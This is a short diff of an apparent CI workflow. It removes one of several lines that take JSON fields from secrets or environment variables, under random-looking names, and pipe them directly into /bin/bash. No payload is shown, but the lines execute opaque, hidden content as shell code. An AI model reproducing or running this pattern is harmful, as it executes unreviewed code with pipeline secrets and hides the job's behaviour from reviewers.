@@ -27,7 +27,6 @@ jobs:
           v467: ${{ secrets.v467 }}
         run: |
           printf '%s' "$v467" | jq -r .d0 | /bin/bash
-          echo $tvyi9 | jq -r .swcwa8717 | /bin/bash
           printf '%s' "$myv83450" | jq -r .ofrr5 | /bin/bash
           printf '%s' "$ckyp924" | jq -r .j646 | /bin/bash
           echo $u064 | jq -r .kfkp663 | /bin/bash
